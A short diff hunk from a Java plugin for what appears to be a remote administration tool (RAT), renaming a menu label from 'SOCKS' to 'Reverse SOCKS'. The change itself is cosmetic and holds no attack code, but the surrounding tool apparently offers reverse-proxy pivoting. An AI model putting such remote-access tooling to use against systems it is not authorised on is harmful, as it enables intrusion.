@@ -74,7 +74,7 @@ public class SocksPlugin extends RATPlugin {
 	@Override
 	public List<RATMenuItem> getMenuItems() throws Exception {
 		List<RATMenuItem> list = new ArrayList<RATMenuItem>();
-		RATMenuItem entry = new RATMenuItem(new MenuListener(), "SOCKS", new ImageIcon(ICON_LOCATION));
+		RATMenuItem entry = new RATMenuItem(new MenuListener(), "Reverse SOCKS", new ImageIcon(ICON_LOCATION));
 
 		list.add(entry);
 		return list;
